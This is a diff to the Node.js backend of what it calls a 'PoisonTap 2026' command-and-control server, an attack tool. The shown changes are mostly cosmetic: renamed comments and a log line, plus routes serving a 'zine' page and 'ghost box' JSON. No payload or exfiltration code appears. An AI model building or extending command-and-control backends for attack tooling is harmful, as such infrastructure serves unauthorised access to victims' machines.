@@ -1,4 +1,4 @@
-// PoisonTap 2026 | Enhanced C2 Backend with All-Seeing Eye UI
+// PoisonTap 2026 | Enhanced C2 Backend with Neo-Occult UI & Ghost Box
 const http = require('http');
 const WebSocket = require('ws');
 const fs = require('fs');
@@ -6,6 +6,7 @@ const fsPromises = fs.promises;
 const crypto = require('crypto');
 const path = require('path');
 const macros = require('./macros');
+const ghostBox = require('./ghost_box');
 
 const PORT = 3000;
 const WSS_PORT = 8443;
@@ -44,15 +45,43 @@ setInterval(() => {
 const server = http.createServer(async (req, res) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
 
-  // Serve All-Seeing Eye 4K UI
+  // Serve All-Seeing Eye Neo-Occult 4K UI
   if (url.pathname === '/' || url.pathname === '/index.html') {
     try {
       const html = await fsPromises.readFile(path.join(__dirname, 'ui_4k_all_seeing_eye.html'), 'utf8');
       res.writeHead(200, {'Content-Type': 'text/html'});
       res.end(html);
     } catch (e) {
-      res.writeHead(500); res.end('UI not found. Generate it.');
+      res.writeHead(500); res.end('UI missing. Download it.');
     }
+    return;
+  }
+
+  // Easter Egg: Illegal Zine
+  if (url.pathname === '/zine') {
+    try {
+      const html = await fsPromises.readFile(path.join(__dirname, 'zine.html'), 'utf8');
+      res.writeHead(200, {'Content-Type': 'text/html'});
+      res.end(html);
+    } catch (e) {
+      res.writeHead(500); res.end('Zine lost to the void.');
+    }
+    return;
+  }
+
+  // Ghost Box Stream
+  if (url.pathname === '/ghostbox') {
+    res.writeHead(200, {'Content-Type': 'application/json'});
+    res.end(JSON.stringify(ghostBox.getSignal()));
+    return;
+  }
+
+  // Signal Deduction
+  if (url.pathname === '/deduce') {
+    const signal = ghostBox.getSignal();
+    const result = ghostBox.deduce(signal);
+    res.writeHead(200, {'Content-Type': 'application/json'});
+    res.end(JSON.stringify({ signal, result }));
     return;
   }
 
@@ -74,5 +103,5 @@ const server = http.createServer(async (req, res) => {
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log(`[+] Backend C2 active: http://0.0.0.0:${PORT} | WSS on ${WSS_PORT} (auth: ${AUTH_TOKEN})`);
+  console.log(`[+] Neo-Occult Backend active: http://0.0.0.0:${PORT}`);
 });
